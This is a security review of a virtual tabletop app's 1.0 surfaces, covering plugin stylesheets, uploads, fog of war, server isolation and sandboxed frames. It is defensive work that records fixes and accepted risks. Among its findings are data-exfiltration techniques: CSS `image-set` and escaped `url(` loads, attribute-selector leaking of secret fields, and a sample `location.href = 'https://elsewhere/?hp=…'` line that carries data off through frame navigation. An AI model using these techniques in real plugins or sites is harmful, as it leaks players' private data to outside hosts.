# Security review for 1.0 (T-1703)

- **Date:** 2026-11-13
- **Scope:** the surfaces added since 0.2.0, as T-1703 names them:
  - uploads;
  - scenes and tokens on the wire, and fog of war;
  - the client sandbox and server isolation for plugin code;
  - module themes, stylesheets, frames, frame events and frame actions.

  Card actions and settings scopes were checked on the way. The [0.1.0 review](security-review.md) (T-0701) still covers the rest.

- **Method:**
  - Read the code paths.
  - Tried each suspected hole in Chromium, Firefox and WebKit, with a small page served on one port and a listener on another, to see what reached the listener.
  - Each finding is **fixed**, with a test, or **accepted**, with the reason. Accepted risks are also in specs §15.

## Summary

| #   | Area               | Finding                                                                                                                          | Outcome  |
| --- | ------------------ | -------------------------------------------------------------------------------------------------------------------------------- | -------- |
| 1   | Plugin stylesheets | `image-set("…")`, `-webkit-image-set("…")`, `src("…")` and escaped names such as `\75 rl(…)` loaded addresses outside the plugin | Fixed    |
| 2   | Server isolation   | Shared functions could hold the server's main thread far past their 100 ms limit, through many calls in one formula              | Fixed    |
| 3   | Client sandbox     | A plugin frame can send what it was given to another site by navigating itself                                                   | Accepted |
| 4   | Module frames      | An interactive overlay covers the whole table page, so it can imitate the app                                                    | Accepted |
| 5   | Uploads            | The image quota is shared by the whole instance, and any user can create a table and fill it                                     | Accepted |
| 6   | Uploads            | Images keep their metadata, such as a photo's location, and may decode to very large sizes                                       | Accepted |
| 7   | Client sandbox     | Shared functions in the browser have the same per-call limit as on the server, without the turn budget of #2                     | Accepted |
| 8   | Fog of war         | The scene's background is sent whole, so a player who opens its address sees the fogged parts                                    | Accepted |
| 9   | Scenes and tokens  | Background images from other sites tell those sites who looks at the scene                                                       | Accepted |

No other problem was found. What was checked is listed under each area.

## Plugin stylesheets

**1 · Fixed.** The scoper (`packages/plugin-schema/src/css/scope.ts`) kept stylesheets inside the plugin by rewriting `url()` and stripping URLs that leave the plugin. It looked only at functions named exactly `url`. In all three browsers, these loaded an outside address:

- `image-set("https://…" 1x)` and `-webkit-image-set(…)`, which take plain strings;
- `\75 rl(https://…)`, which browsers read as `url(`.

The app page's policy allows images from any HTTPS site, because portraits are addresses. A plugin needs no code to ship stylesheets, so it needs no admin acknowledgement either. Its CSS could therefore:

- tell another site who opens a sheet;
- with attribute selectors such as `input[value^="a"]`, send sheet values to that site one character at a time, including secret fields on a GM's screen.

The fix:

- String arguments of `image-set`, `-webkit-image-set`, `image` and `cross-fade` are URLs, resolved like `url()`.
- `src()` is treated like `url()`.
- A declaration with an escape outside a string is stripped with a warning. Nothing a stylesheet needs is written that way.

`CSS_SCOPE_VERSION` went up, so cached stylesheets are scoped again. Tested in `packages/plugin-schema/test/css.test.ts`. The same browser check loads nothing from the fixed output.

Checked, no other finding:

- At-rules come from an allowlist (`@media`, `@supports`, `@container`, `@layer`, `@font-face`, keyframes), so `@import`, including an escaped one, is stripped.
- A system's selectors are scoped to its sheets. A module's must name a part, or be `:root` alone.
- `z-index` on `:root` is stripped, and `html` and `body` selectors are dropped.
- Everything sits in `@layer plugin` or `@layer module`, below the app's own rules where it matters.

## Module themes

Checked, no finding:

- `theme.json` values are checked against strict patterns before they reach `theme.css`:
  - colours: hex, names, or colour functions of plain numbers;
  - lengths: numbers with `px`, `rem` or `em`;
  - fonts: letters, digits, spaces and a few separators, without parentheses, semicolons or braces.

  A value cannot close a declaration or bring in a `url()`.

- Images and font files must be files of the module, with no `..` segments. Theme images must be raster images. SVG is allowed only for status icons, which are served under a policy that stops scripts.

## Uploads

Checked, no finding:

- **Types:** the server reads the type from the leading bytes alone (PNG, JPEG, GIF, WebP) and refuses anything else, SVG included. The request's content type and the file name are never trusted.
- **Limits:** the size limit and the instance quota are checked, and the quota again in the transaction that writes the row, so two uploads cannot both slip under it. The file is written under a temporary name and renamed.
- **Who:** only the table's GMs and assistants upload, and only to a table that is not archived.
- **Reading:** only the table's members can read an asset. Anyone else gets 404, as if it did not exist.
- **Serving:**
  - with its sniffed type, `nosniff`, and the data policy (`default-src 'none'`), so an image opened on its own runs nothing;
  - `private`, so shared caches never keep it.
- **Deleting:** an image in use by an actor, item, journal entry, scene or token cannot be deleted.

**5 · Accepted: one quota for the instance.** Any user may create a table and upload to it, so one user can use up the quota for everyone. Users are created by admins, registration is closed or by invitation, and admins can raise the quota. Revisit if instances open to strangers, with a quota per user or per table.

**6 · Accepted: image metadata and size.**

- **Metadata:** uploads are stored as sent, so a photo's EXIF data, which may include where it was taken, reaches every member of the table. Stripping it would mean decoding and re-encoding images on the server.
- **Size:** an image under the size limit may still decode to a very large picture and slow down the browsers that draw it.

Only GMs and assistants upload, and the GM picks who joins the table.

## Scenes, tokens and fog of war

Checked, no finding:

- **Scenes:** players and spectators get only the active scene. Any other scene answers 404 to them.
- **Tokens:** players get a scene's tokens only when they are not hidden and not in the fog. A player always sees the tokens of actors they own (`canSeeToken`, `@vtt/shared`). A token they may not see answers 404.
- **Events:** `token.updated` carries only the scene's id. It goes to the members who could see the token before or after the change, so the moves of a hidden or fogged token never reach players. Everyone else fetches what they may see.
- **Moving:** players move only the tokens of actors they own, and only while they can see them. Changing a token's name, image or hidden flag is for GMs and assistants.
- **What a token refers to:** a token's actor must belong to the same table. A token's own image must be one of the table's images.
- **Statuses:** statuses from secret fields reach only GMs and assistants (ADR-083).
- **Card actions:** applying a card's action (T-1617) needs:
  - a message the caller may see;
  - an actor of the same table they may edit.

  The amount is clamped, and secret counters are reached only by GMs and assistants.

**8 · Accepted: the background is not cut by the fog.** The fog hides tokens on the server, but the background image is one file, so a player who opens its address sees all of it. This is ADR-070's choice: cutting images per player on the server costs more than this game needs. GMs who need it can use a background that does not give the secret away.

**9 · Accepted: background images from other sites.** A scene's background may be an address on another site, as portraits may (0.1.0). Each viewer's browser fetches it, so that site learns who looks at the scene and when. GMs choose the address, and uploading the image keeps it on the instance.

## Server isolation

**2 · Fixed.** Shared functions (`code/shared`) run in the plugin's worker, and formulas call them synchronously. The main thread waits for each answer for up to 100 ms, then stops the worker. A formula may call them up to its 10,000 steps, so a function that takes just under 100 ms each time could hold the main thread, and every table on the instance, for minutes.

Now the time the main thread spends waiting on shared functions is added up across all plugins, for each turn of its event loop (`FUNCTION_TURN_LIMIT_MS`, 500 ms). Past that, further calls fail as formula errors until the next turn. A call costs about 0.15 ms of messaging, so this leaves room for some 3,000 quick calls. A roll or a counter's bounds makes a few hundred at most. Tested in `apps/server/test/plugin-code.test.ts`.

Checked, no other finding:

- **The engine:** plugin code runs in QuickJS inside a worker thread per plugin (ADR-073), with:
  - 32 MB of engine memory, a 512 KB stack and a 64 MB worker heap;
  - no Node API and no imports;
  - 5 seconds per handler, command or hook, `ctx` calls included.

  A plugin that overruns any of these loses its worker, and the next call starts a new one.

- **`ctx` acts as the sender** (`apps/server/src/domain/rolls.ts`):
  - `ctx.actors.get` returns only actors of the table the sender may see, with secret fields only for GMs and assistants.
  - `adjust`, `adjustItem` and `set` need an actor or item the sender may edit, and reach secret fields only for GMs and assistants.
  - `post` posts only rolls made with `ctx.roll` in the same call, at most `MAX_HANDLER_POSTS` messages.
- **Combat hooks** run as the GM or assistant who moved the turn. Only they may run combat.
- **The migrate hook** gets no `ctx`.

## Client sandbox

Checked, no finding:

- **Each node, card, overlay and panel** renders in `<iframe sandbox="allow-scripts">` without `allow-same-origin`. The frame has an opaque origin, no cookies or storage, and no access to the app's window.
- **The frame page's policy** (`default-src 'none'`, in the page and as a header) stops every fetch, image and font from a server. The frame also has no popups, forms, top navigation or downloads.
- **Messages:** the app takes a message only from that frame's window, and only if it passes `frameMessageSchema`.
- **Writes:** a sheet write goes through the sheet's store and the server, like the viewer's own edit.

**3 · Accepted: frames can navigate away.** A frame cannot fetch, but its code can navigate the frame itself, as with `location.href = 'https://elsewhere/?hp=…'`. That sends whatever the frame was given in the address. In all three browsers, the request reached the listener while `fetch` from the same frame was blocked.

- **Why it can't be fixed:** no sandbox flag or policy directive stops a frame from navigating itself. `navigate-to` was dropped from CSP.
- **What a frame can send:** only what it was given. That is:
  - for a sheet node, the sheet as the viewer sees it, which is everything for a GM;
  - for a card, its message;
  - for a module frame, the events the viewer receives.
- **Why it's accepted:** code still needs an admin's acknowledgement before a plugin is enabled (ADR-020), and a replaced plugin with code starts disabled again.

ADR-074 claimed frames have "no network". It, specs §8.10 and the guide's **Plugin code** section now say what the sandbox stops and what it does not.

**7 · Accepted: shared functions in the browser.** The browser runs `code/shared` in QuickJS in the page, with 100 ms per call and no budget per turn. A slow function can freeze that viewer's tab, but not the server or anyone else's. The plugin's code was acknowledged by an admin, who can disable the plugin.

## Module frames, events and actions

Checked, no finding:

- **Events:** a module frame hears only the events the page already received, which the server filtered for the viewer: chat messages and edits, deletions, combat, scene and token changes, the last two without their data (`frameEvent`).
- **Actions** go through the API with the viewer's own session, so the server checks each as the viewer's:
  - they are checked against `frameActionSchema`;
  - they are limited to 10 in 10 seconds per frame, and the limit outlives a frame that reloads itself;
  - `openSheet` takes only actors the viewer sees, and `openJournal` asks the server first;
  - `setting` writes only the module's `user` settings, which the server checks by scope.
- **Settings scopes:** each endpoint takes only its own scope's settings:
  - instance settings only from admins;
  - table settings only from those who manage the table (`canManageTable`);
  - user settings only for the caller.

**4 · Accepted: overlays over the whole page.** An interactive overlay is a frame over the table page, so it can draw anything there, including something that looks like the app's own forms. With #3, what someone types into it can leave the instance. Overlays come from modules with code, which an admin must enable and acknowledge, and which a GM must add to the table. Each viewer can turn overlays off in **My settings** (ADR-077).
